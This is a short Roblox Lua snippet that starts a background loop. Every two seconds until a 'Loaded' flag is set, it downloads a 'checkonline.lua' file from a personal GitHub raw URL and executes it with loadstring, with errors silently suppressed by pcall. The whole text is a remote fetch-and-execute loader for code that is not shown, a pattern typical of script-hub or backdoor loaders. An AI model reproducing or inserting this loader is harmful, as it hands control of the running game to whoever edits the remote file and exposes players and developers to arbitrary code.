task.spawn(function()
    while not Loaded and task.wait(2) do
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/u400822/module/refs/heads/main/checkonline.lua"))()
        end)
    end
end)
